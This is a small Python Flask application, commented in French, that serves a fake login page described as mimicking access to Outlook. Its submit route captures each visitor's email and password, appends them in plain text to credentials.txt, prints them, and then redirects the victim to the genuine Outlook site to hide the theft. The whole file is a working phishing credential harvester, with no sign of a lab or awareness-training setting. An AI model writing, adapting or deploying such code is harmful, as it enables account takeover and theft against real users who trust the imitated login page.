# -*- coding: utf-8 -*-
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# Route qui affiche la fausse page de connexion
@app.route("/")
def login_page():
    return render_template("login.html")

# Route qui récupère les identifiants saisis et les stocke
@app.route("/submit", methods=["POST"])
def submit():
    email = request.form["email"]
    password = request.form["password"]
    
    # Enregistrer les identifiants dans un fichier texte
    with open("credentials.txt", "a") as file:
        file.write(f"Email: {email} | Password: {password}\n")
    
    print(f"Identifiants reçus - Email: {email}, Password: {password}")

    # Redirige l'utilisateur vers le vrai site Outlook
    return redirect("https://outlook.live.com/")

# Lancer le serveur Flask
if __name__ == "__main__":
    app.run(debug=True)

